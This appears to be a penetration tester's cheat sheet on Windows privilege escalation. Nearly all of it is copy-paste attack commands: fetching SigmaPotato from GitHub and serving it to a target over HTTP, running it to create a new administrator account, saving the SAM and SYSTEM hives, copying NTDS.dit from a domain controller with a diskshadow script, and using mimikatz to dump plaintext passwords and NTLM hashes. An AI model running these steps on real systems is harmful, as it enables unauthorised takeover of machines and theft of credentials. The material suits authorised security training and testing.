# Enumerate Privileges of current user
```batch
whoami /priv
```
# Privileges known to lead to Privilege Escalation
* SeImpersonatePrivilege
* SeBackupPrivilege
* SeAssignPrimaryToken
* SeLoadDriver
* SeDebug

In most configurations, IIS (Windows Webserver) will run as LocalService, LocalSystem, NetworkService, or ApplicationPoolIdentity, which all have SeImpersonatePrivilege assigned.

This also applies to other Windows services.
# SeImpersonatePrivilege
To exploit this privilege, SigmaPotato (or other "potato" exploits) can be used to trick "NT AUTHORITY\SYSTEM" into authenticating into a malicious named pipe, allowing us to execute commands as them.
```bash
wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe
```
```bash
python -m http.server 80
```
```powershell
iwr -uri http://$(IP_ADDRESS)/SigmaPotato.exe -OutFile SigmaPotato.exe
```
```powershell
.\SigmaPotato "net user dave4 lab /add"
```
```powershell
.\SigmaPotato "net localgroup Administrators dave4 /add"
```
# SeBackupPrivilege
Domain Controllers won't store passwords in SAM but NTDS.dit - however old passwords could still be there. Always run BOTH on DC.
## Local Windows
```
mkdir C:\temp
```
```
reg save HKLM\SAM SAM
```
```
reg save HKLM\SYSTEM SYSTEM
```
Then transfer the sam and system files to kali (i.e. download on winrm, shared folder on xfreerdp, etc).

Then run the following to dump hashes:
```bash
impacket-secretsdump local -sam SAM -system SYSTEM
```
## Domain Controller
Save this as diskshadow.txt:
```
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
```
```
unix2dos diskshadow.txt
```
Upload the created file to the target.

On the remote target, run the following:
```
mkdir C:\temp
```
```
diskshadow /s diskshadow.txt
```
```
robocopy /b E:\Windows\ntds . ntds.dit
```
Transfer ntds.dit from the target to the attacker machine.
# Mimikatz
If a user has either of the following privileges, mimikatz can be used:
* SeImpersonatePrivilege
* SeDebugPrivilege

Once mimikatz is transferred to the target windows device, run it as administrator via powershell.

Enable SeDebugPrivilege (require for dumping passwords):
```
privilege::debug
```
Elevate privileges to SYSTEM (also required):
```
token::elevate
```
Dump plaintext and hashed passwords from ALL sources:
```
sekurlsa::logonpasswords
```
Dump only NTLM hashes from SAM database:
```
lsadump::sam
```
# Meterpreter
```
getsystem
```
